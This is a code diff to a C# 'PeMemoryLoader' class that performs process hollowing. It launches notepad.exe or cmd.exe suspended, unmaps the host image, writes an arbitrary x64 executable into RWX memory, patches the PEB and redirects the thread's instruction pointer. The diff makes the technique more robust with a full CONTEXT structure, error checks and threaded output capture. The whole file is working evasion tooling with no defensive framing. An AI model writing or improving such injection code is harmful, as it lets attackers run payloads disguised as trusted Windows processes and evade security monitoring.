@@ -2,6 +2,7 @@ using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 
 public class PeMemoryLoader
 {
@@ -22,6 +23,14 @@ public class PeMemoryLoader
     const uint INFINITE = 0xFFFFFFFF;
     const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
     const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b;
+    const ushort IMAGE_SUBSYSTEM_WINDOWS_GUI = 2;
+    const ushort IMAGE_SUBSYSTEM_WINDOWS_CUI = 3;
+    const uint CONTEXT_AMD64 = 0x00100000;
+    const uint CONTEXT_CONTROL = CONTEXT_AMD64 | 0x1;
+    const uint CONTEXT_INTEGER = CONTEXT_AMD64 | 0x2;
+    const uint CONTEXT_FLOATING_POINT = CONTEXT_AMD64 | 0x8;
+    const uint CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10;
+    const uint CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT;
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     struct STARTUPINFO
@@ -62,7 +71,17 @@ public class PeMemoryLoader
         public IntPtr Reserved3;
     }
 
-    [StructLayout(LayoutKind.Sequential)]
+    [StructLayout(LayoutKind.Sequential, Pack = 16)]
+    struct M128A
+    {
+        public ulong Low;
+        public long High;
+    }
+
+    // Full x64 CONTEXT structure — 1232 bytes on disk, matching the
+    // Windows kernel. A smaller struct causes GetThreadContext to
+    // overrun the managed buffer and corrupt the stack.
+    [StructLayout(LayoutKind.Sequential, Pack = 16)]
     struct CONTEXT64
     {
         public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
@@ -74,6 +93,22 @@ public class PeMemoryLoader
         public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
         public ulong R8, R9, R10, R11, R12, R13, R14, R15;
         public ulong Rip;
+        public M128A Header0, Header1;
+        public M128A Legacy0, Legacy1, Legacy2, Legacy3;
+        public M128A Legacy4, Legacy5, Legacy6, Legacy7;
+        public M128A Xmm0, Xmm1, Xmm2, Xmm3, Xmm4, Xmm5, Xmm6, Xmm7;
+        public M128A Xmm8, Xmm9, Xmm10, Xmm11, Xmm12, Xmm13, Xmm14, Xmm15;
+        public M128A VectorRegister0, VectorRegister1, VectorRegister2, VectorRegister3;
+        public M128A VectorRegister4, VectorRegister5, VectorRegister6, VectorRegister7;
+        public M128A VectorRegister8, VectorRegister9, VectorRegister10, VectorRegister11;
+        public M128A VectorRegister12, VectorRegister13, VectorRegister14, VectorRegister15;
+        public M128A VectorRegister16, VectorRegister17, VectorRegister18, VectorRegister19;
+        public M128A VectorRegister20, VectorRegister21, VectorRegister22, VectorRegister23;
+        public M128A VectorRegister24, VectorRegister25;
+        public ulong VectorControl;
+        public ulong DebugControl;
+        public ulong LastBranchToRip, LastBranchFromRip;
+        public ulong LastExceptionToRip, LastExceptionFromRip;
     }
 
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
@@ -93,6 +128,10 @@ public class PeMemoryLoader
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
         uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
+        uint flNewProtect, out uint lpflOldProtect);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
@@ -183,6 +222,7 @@ public class PeMemoryLoader
         uint relocSize = ReadUInt(pe, nt + 0xB4);
         if (relocRva == 0 || relocSize == 0 || delta == 0) return;
         int offset = RvaToOffset(pe, nt, relocRva);
+        if (offset < 0) return;
         int end = offset + (int)relocSize;
         while (offset < end)
         {
@@ -212,17 +252,21 @@ public class PeMemoryLoader
         uint importRva = ReadUInt(pe, nt + 0x90);
         if (importRva == 0) return;
         int descOffset = RvaToOffset(pe, nt, importRva);
+        if (descOffset < 0) return;
         while (true)
         {
             uint nameRva = ReadUInt(pe, descOffset + 12);
             uint firstThunk = ReadUInt(pe, descOffset + 16);
             uint origThunk = ReadUInt(pe, descOffset);
             if (nameRva == 0) break;
-            string dllName = ReadAscii(pe, RvaToOffset(pe, nt, nameRva));
+            int nameOffset = RvaToOffset(pe, nt, nameRva);
+            if (nameOffset < 0) throw new Exception("Bad import name RVA");
+            string dllName = ReadAscii(pe, nameOffset);
             IntPtr hMod = LoadLibraryA(dllName);
             if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dllName);
             uint thunk = origThunk != 0 ? origThunk : firstThunk;
             int thunkOff = RvaToOffset(pe, nt, thunk);
+            if (thunkOff < 0) throw new Exception("Bad thunk RVA");
             int i = 0;
             while (true)
             {
@@ -230,30 +274,22 @@ public class PeMemoryLoader
                 if (lookup == 0) break;
                 IntPtr fn;
                 if ((lookup & 0x8000000000000000L) != 0)
+                {
                     fn = GetProcAddress(hMod, "#" + (lookup & 0xFFFF));
+                }
                 else
-                    fn = GetProcAddress(hMod, ReadAscii(pe, RvaToOffset(pe, nt, (uint)lookup) + 2));
-                if (fn == IntPtr.Zero) throw new Exception("GetProcAddress failed");
+                {
+                    int nameOff = RvaToOffset(pe, nt, (uint)lookup);
+                    if (nameOff < 0) throw new Exception("Bad import name RVA");
+                    fn = GetProcAddress(hMod, ReadAscii(pe, nameOff + 2));
+                }
+                if (fn == IntPtr.Zero) throw new Exception("GetProcAddress failed in " + dllName);
                 IntPtr iat = IntPtr.Add(remoteBase, (int)(firstThunk + (uint)(i * 8)));
                 WriteRemote(hProcess, iat, BitConverter.GetBytes(fn.ToInt64()));
                 i++;
             }
             descOffset += 20;
         }
-    }
-
-    static string ReadPipe(IntPtr hPipe)
-    {
-        var sb = new StringBuilder();
-        var buf = new byte[4096];
-        uint avail;
-        while (PeekNamedPipe(hPipe, null, 0, out _, out avail, out _) && avail > 0)
-        {
-            int toRead = (int)Math.Min(avail, (uint)buf.Length);
-            if (!ReadFile(hPipe, buf, toRead, out uint read, IntPtr.Zero) || read == 0) break;
-            sb.Append(Encoding.UTF8.GetString(buf, 0, (int)read));
-        }
-        return sb.ToString();
     }
 
     static void PatchCommandLine(IntPtr hProcess, IntPtr peb, string arguments)
@@ -275,24 +311,95 @@ public class PeMemoryLoader
         WriteRemote(hProcess, IntPtr.Add(procParams, 0x70), uni);
     }
 
+    // Background pipe drain — runs on its own thread so the target
+    // process cannot deadlock when it fills the pipe buffer.
+    static void DrainPipe(IntPtr hPipe, StringBuilder sink, ManualResetEventSlim done)
+    {
+        try
+        {
+            var buf = new byte[8192];
+            while (true)
+            {
+                if (!PeekNamedPipe(hPipe, null, 0, out _, out uint avail, out _))
+                    break;
+                if (avail == 0)
+                {
+                    Thread.Sleep(20);
+                    continue;
+                }
+                int toRead = (int)Math.Min(avail, (uint)buf.Length);
+                if (!ReadFile(hPipe, buf, toRead, out uint read, IntPtr.Zero) || read == 0)
+                    break;
+                lock (sink)
+                {
+                    sink.Append(Encoding.UTF8.GetString(buf, 0, (int)read));
+                }
+            }
+        }
+        catch
+        {
+            // Drain thread dies quietly; the main thread still returns
+            // whatever was collected before the failure.
+        }
+        finally
+        {
+            done.Set();
+        }
+    }
+
     public static Result Execute(byte[] pe, string arguments)
     {
         var result = new Result { StdOut = "", StdErr = "", ExitCode = 1 };
         IntPtr hStdoutRead = IntPtr.Zero, hStdoutWrite = IntPtr.Zero;
         IntPtr hStderrRead = IntPtr.Zero, hStderrWrite = IntPtr.Zero;
         PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+        var stage = "init";
+
         try
         {
-            if (pe == null || pe.Length < 0x200) throw new Exception("Invalid PE buffer");
+            if (pe == null || pe.Length < 0x200)
+                throw new Exception("Invalid PE buffer");
+
+            stage = "parse_headers";
             int nt = ReadInt(pe, 0x3c);
+            if (nt <= 0 || nt + 0x108 > pe.Length)
+                throw new Exception("Invalid NT header offset");
             if (ReadUShort(pe, nt + 0x18) != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
-                throw new Exception("Only x64 PE images are supported for in-memory execution");
+                throw new Exception("Only x64 PE images are supported");
             if (ReadUShort(pe, nt + 4) != IMAGE_FILE_MACHINE_AMD64)
                 throw new Exception("PE machine type is not AMD64");
 
-            string host = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe");
-            CreatePipe(out hStdoutRead, out hStdoutWrite, IntPtr.Zero, 0);
-            CreatePipe(out hStderrRead, out hStderrWrite, IntPtr.Zero, 0);
+            int opt = nt + 0x18;
+            uint sizeOfImage = ReadUInt(pe, opt + 56);
+            uint sizeOfHeaders = ReadUInt(pe, opt + 60);
+            uint entry = ReadUInt(pe, opt + 16);
+            long preferred = ReadLong(pe, opt + 24);
+            ushort subsystem = ReadUShort(pe, opt + 0x44);
+
+            // Pick the host based on subsystem. Console binaries need a
+            // console host so their stdout/stderr handles resolve into
+            // the pipes we create.
+            stage = "pick_host";
+            string sys32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
+            string host;
+            if (subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI)
+                host = Path.Combine(sys32, "cmd.exe");
+            else
+                host = Path.Combine(sys32, "notepad.exe");
+            if (!File.Exists(host))
+                throw new Exception("Host binary not found: " + host);
+
+            stage = "create_pipes";
+            // 1 MB pipe buffers so short bursts of output do not block.
+            if (!CreatePipe(out hStdoutRead, out hStdoutWrite, IntPtr.Zero, 1 << 20))
+                throw new Exception("CreatePipe (stdout) failed");
+            if (!CreatePipe(out hStderrRead, out hStderrWrite, IntPtr.Zero, 1 << 20))
+                throw new Exception("CreatePipe (stderr) failed");
+
+            stage = "create_process";
+            string cmdLine = "\"" + host + "\"";
+            if (!string.IsNullOrEmpty(arguments))
+                cmdLine += " " + arguments;
 
             STARTUPINFO si = new STARTUPINFO();
             si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
@@ -300,37 +407,62 @@ public class PeMemoryLoader
             si.hStdOutput = hStdoutWrite;
             si.hStdError = hStderrWrite;
 
-            if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, true,
+            if (!CreateProcess(host, cmdLine, IntPtr.Zero, IntPtr.Zero, true,
                 CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                 throw new Exception("CreateProcess failed: " + Marshal.GetLastWin32Error());
 
+            // Parent no longer needs the write ends of the pipes.
             CloseHandle(hStdoutWrite); hStdoutWrite = IntPtr.Zero;
             CloseHandle(hStderrWrite); hStderrWrite = IntPtr.Zero;
 
-            int opt = nt + 0x18;
-            uint sizeOfImage = ReadUInt(pe, opt + 56);
-            uint sizeOfHeaders = ReadUInt(pe, opt + 60);
-            uint entry = ReadUInt(pe, opt + 16);
-            long preferred = ReadLong(pe, opt + 24);
+            // Start the drain threads immediately so the target cannot
+            // fill the pipe buffer while we set up the loader.
+            stage = "start_drains";
+            var stdoutBuf = new StringBuilder();
+            var stderrBuf = new StringBuilder();
+            var stdoutDone = new ManualResetEventSlim(false);
+            var stderrDone = new ManualResetEventSlim(false);
+            var stdoutThread = new Thread(() => DrainPipe(hStdoutRead, stdoutBuf, stdoutDone))
+            { IsBackground = true, Name = "pe_stdout" };
+            var stderrThread = new Thread(() => DrainPipe(hStderrRead, stderrBuf, stderrDone))
+            { IsBackground = true, Name = "pe_stderr" };
+            stdoutThread.Start();
+            stderrThread.Start();
 
+            stage = "query_peb";
             PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
-            NtQueryInformationProcess(pi.hProcess, 0, ref pbi, Marshal.SizeOf(pbi), out _);
+            int qstat = NtQueryInformationProcess(pi.hProcess, 0, ref pbi,
+                Marshal.SizeOf(pbi), out _);
+            if (qstat != 0)
+                throw new Exception("NtQueryInformationProcess failed: 0x" + qstat.ToString("X8"));
 
             byte[] pebBuf = new byte[8];
-            ReadProcessMemory(pi.hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10), pebBuf, 8, out _);
+            if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10),
+                    pebBuf, 8, out _))
+                throw new Exception("ReadProcessMemory (PEB ImageBase) failed");
             long hostBase = BitConverter.ToInt64(pebBuf, 0);
 
-            NtUnmapViewOfSection(pi.hProcess, (IntPtr)hostBase);
+            stage = "unmap_host";
+            int ustat = NtUnmapViewOfSection(pi.hProcess, (IntPtr)hostBase);
+            if (ustat != 0)
+                throw new Exception("NtUnmapViewOfSection failed: 0x" + ustat.ToString("X8"));
 
+            stage = "alloc_remote";
             IntPtr remote = VirtualAllocEx(pi.hProcess, (IntPtr)preferred, sizeOfImage,
                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
             if (remote == IntPtr.Zero)
+            {
+                // Preferred base unavailable — relocate.
                 remote = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeOfImage,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            if (remote == IntPtr.Zero) throw new Exception("VirtualAllocEx failed");
+            }
+            if (remote == IntPtr.Zero)
+                throw new Exception("VirtualAllocEx failed");
 
+            stage = "write_headers";
             WriteRemote(pi.hProcess, remote, SubArray(pe, 0, (int)sizeOfHeaders));
 
+            stage = "write_sections";
             ushort sections = ReadUShort(pe, nt + 6);
             int secTable = opt + ReadUShort(pe, nt + 0x14);
             for (int i = 0; i < sections; i++)
@@ -340,36 +472,55 @@ public class PeMemoryLoader
                 uint sizeRaw = ReadUInt(pe, s + 16);
                 uint ptrRaw = ReadUInt(pe, s + 20);
                 if (sizeRaw == 0) continue;
+                if ((long)ptrRaw + sizeRaw > pe.Length) continue;
                 WriteRemote(pi.hProcess, IntPtr.Add(remote, (int)virtualAddress),
                     SubArray(pe, (int)ptrRaw, (int)sizeRaw));
             }
 
             long delta = remote.ToInt64() - preferred;
-            if (delta != 0) ApplyRelocations(pe, pi.hProcess, remote, delta, nt);
+            if (delta != 0)
+            {
+                stage = "reloc";
+                ApplyRelocations(pe, pi.hProcess, remote, delta, nt);
+            }
+
+            stage = "imports";
             ResolveImports(pe, pi.hProcess, remote, nt);
 
+            stage = "patch_peb";
             WriteRemote(pi.hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10),
                 BitConverter.GetBytes(remote.ToInt64()));
             PatchCommandLine(pi.hProcess, pbi.PebBaseAddress, arguments);
 
+            stage = "set_context";
             CONTEXT64 ctx = new CONTEXT64();
-            ctx.ContextFlags = 0x10001f;
-            GetThreadContext(pi.hThread, ref ctx);
+            ctx.ContextFlags = CONTEXT_FULL;
+            if (!GetThreadContext(pi.hThread, ref ctx))
+                throw new Exception("GetThreadContext failed: " + Marshal.GetLastWin32Error());
             ctx.Rip = (ulong)(remote.ToInt64() + entry);
-            SetThreadContext(pi.hThread, ref ctx);
+            if (!SetThreadContext(pi.hThread, ref ctx))
+                throw new Exception("SetThreadContext failed: " + Marshal.GetLastWin32Error());
 
+            stage = "resume";
             ResumeThread(pi.hThread);
+
+            stage = "wait";
             WaitForSingleObject(pi.hProcess, INFINITE);
             uint code;
             GetExitCodeProcess(pi.hProcess, out code);
             result.ExitCode = (int)code;
-            result.StdOut = ReadPipe(hStdoutRead);
-            result.StdErr = ReadPipe(hStderrRead);
+
+            // Give the drain threads a moment to flush remaining output.
+            stdoutDone.Wait(2000);
+            stderrDone.Wait(2000);
+
+            lock (stdoutBuf) result.StdOut = stdoutBuf.ToString();
+            lock (stderrBuf) result.StdErr = stderrBuf.ToString();
         }
         catch (Exception ex)
         {
-            result.Error = ex.Message;
-            result.ExitCode = 1;
+            result.Error = "[" + stage + "] " + ex.Message;
+            result.ExitCode = -1;
         }
         finally
         {
